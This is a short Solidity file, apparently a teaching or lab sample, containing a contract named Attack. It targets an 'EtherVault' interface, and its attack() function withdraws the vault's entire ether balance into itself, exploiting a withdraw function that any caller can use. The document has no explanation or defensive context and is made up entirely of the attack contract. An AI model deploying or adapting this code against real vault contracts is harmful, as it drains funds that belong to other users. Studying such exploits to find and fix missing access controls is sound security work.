//SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

interface IEtherVault {
    function withdraw(uint256 _amount) external;
    function getEtherBalance() external view returns (uint256);
}

contract Attack {
    IEtherVault public immutable etherVault;

    constructor(IEtherVault _etherVault) {
        etherVault = _etherVault;
    }

    receive() external payable {}

    function attack() external {
        etherVault.withdraw(etherVault.getEtherBalance());
    }

    function getEtherBalance() external view returns (uint256) {
        return address(this).balance;
    }
}